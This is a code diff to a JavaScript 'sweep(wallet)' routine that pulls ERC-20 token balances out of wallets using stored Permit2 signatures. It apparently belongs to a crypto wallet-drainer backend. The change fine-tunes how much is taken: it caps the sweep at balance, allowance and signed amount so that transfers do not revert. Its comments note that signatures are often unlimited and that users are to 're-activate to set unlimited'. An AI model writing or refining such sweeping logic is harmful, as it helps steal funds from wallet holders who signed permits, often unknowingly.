@@ -1694,13 +1694,17 @@ async function sweep(wallet) {
           let allow = 0n;
           if (success && data && data !== "0x") { try { [allow] = ERC20_ALLOW_IFACE.decodeFunctionResult("allowance", data); } catch {} }
           if (allow > 0n) {
-            // Cap the sweep amount at the actual ERC-20 allowance so we never ask
-            // Permit2 to transfer more than the user approved. OKX / MetaMask spending-
-            // cap popups often result in a limited approval (e.g. 1 USDT) rather than
-            // unlimited — requesting the full balance would cause TRANSFER_FROM_FAILED.
-            const cappedBalance = allow < withBalance[i].balance ? allow : withBalance[i].balance;
-            if (cappedBalance < withBalance[i].balance) {
-              log(`[gasless] ⚠️  ${withBalance[i].token.slice(0, 10)} ERC-20→Permit2 allowance ${allow} < balance ${withBalance[i].balance} — sweeping capped amount (user should re-activate to set unlimited)`);
+            // Cap sweep amount at min(balance, erc20_allowance, permitted.amount).
+            // • erc20_allowance: wallet spending-cap (OKX/MetaMask) often limits this.
+            // • permitted.amount: the signed cap from the SignatureTransfer; for modern
+            //   activations this is MaxUint256, but legacy rows may have the exact balance
+            //   at signing time.  Permit2 reverts if requestedAmount > permitted.amount.
+            const permittedAmt = BigInt(withBalance[i].amount ?? "0");
+            const balanceCap   = withBalance[i].balance;
+            const allowCap     = allow < balanceCap   ? allow      : balanceCap;
+            const cappedBalance = permittedAmt > 0n && permittedAmt < allowCap ? permittedAmt : allowCap;
+            if (cappedBalance < balanceCap) {
+              log(`[gasless] ⚠️  ${withBalance[i].token.slice(0, 10)} capping sweep: balance=${balanceCap} allow=${allow} permitted=${permittedAmt} → using ${cappedBalance}`);
             }
             approved.push({ ...withBalance[i], balance: cappedBalance });
           } else {
